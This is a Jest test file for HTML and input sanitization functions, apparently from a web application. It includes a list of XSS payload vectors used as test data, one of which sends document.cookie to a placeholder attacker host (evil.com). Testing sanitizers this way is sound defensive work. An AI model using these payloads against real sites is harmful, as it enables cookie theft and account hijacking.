import { sanitizeHTML, sanitizeInput, validateMessageLength } from '@/lib/sanitization'

describe('Sanitization Functions', () => {
  describe('sanitizeHTML', () => {
    it('should remove dangerous scripts', () => {
      const dangerous = '<p>Hello<script>alert("XSS")</script>World</p>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<p>HelloWorld</p>')
    })

    it('should remove event handlers', () => {
      const dangerous = '<button onclick="alert(\'XSS\')">Click me</button>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<button>Click me</button>')
    })

    it('should allow safe HTML tags', () => {
      const safe = '<p>This is <strong>bold</strong> and <em>italic</em></p>'
      const result = sanitizeHTML(safe)
      expect(result).toBe(safe)
    })

    it('should remove javascript: URLs', () => {
      const dangerous = '<a href="javascript:alert(\'XSS\')">Click</a>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<a>Click</a>')
    })

    it('should handle empty input', () => {
      expect(sanitizeHTML('')).toBe('')
      expect(sanitizeHTML(null as any)).toBe('')
      expect(sanitizeHTML(undefined as any)).toBe('')
    })
  })

  describe('sanitizeInput', () => {
    it('should trim whitespace', () => {
      expect(sanitizeInput('  hello world  ')).toBe('hello world')
    })

    it('should remove HTML tags', () => {
      expect(sanitizeInput('<p>Hello</p>')).toBe('Hello')
    })

    it('should handle special characters', () => {
      expect(sanitizeInput('Hello & <World>')).toBe('Hello &amp; &lt;World&gt;')
    })

    it('should handle empty input', () => {
      expect(sanitizeInput('')).toBe('')
      expect(sanitizeInput(null as any)).toBe('')
      expect(sanitizeInput(undefined as any)).toBe('')
    })
  })

  describe('validateMessageLength', () => {
    it('should validate message length', () => {
      const result = validateMessageLength('Hello World', 20)
      expect(result.isValid).toBe(true)
      expect(result.sanitized).toBe('Hello World')
    })

    it('should reject messages that are too long', () => {
      const longMessage = 'a'.repeat(100)
      const result = validateMessageLength(longMessage, 50)
      expect(result.isValid).toBe(false)
      expect(result.sanitized).toHaveLength(50)
      expect(result.error).toContain('too long')
    })

    it('should handle empty input', () => {
      const result = validateMessageLength('')
      expect(result.isValid).toBe(false)
      expect(result.error).toContain('cannot be empty')
    })
  })

  describe('XSS Prevention Tests', () => {
    const xssVectors = [
      '<img src=x onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)">',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus>',
      '<textarea onfocus="alert(1)" autofocus>',
      '<keygen onfocus="alert(1)" autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio><source onerror="alert(1)">',
      '<details open ontoggle="alert(1)">',
      '<marquee onstart="alert(1)">',
      '<meter onmouseover="alert(1)"//9>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(document.cookie)</script>',
      '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    ]

    xssVectors.forEach((vector) => {
      it(`should prevent XSS: ${vector.substring(0, 30)}...`, () => {
        const sanitized = sanitizeHTML(vector)
        expect(sanitized).not.toContain('alert')
        expect(sanitized).not.toContain('script')
        expect(sanitized).not.toContain('onerror')
        expect(sanitized).not.toContain('onload')
        expect(sanitized).not.toContain('onfocus')
        expect(sanitized).not.toContain('javascript:')
      })
    })
  })
})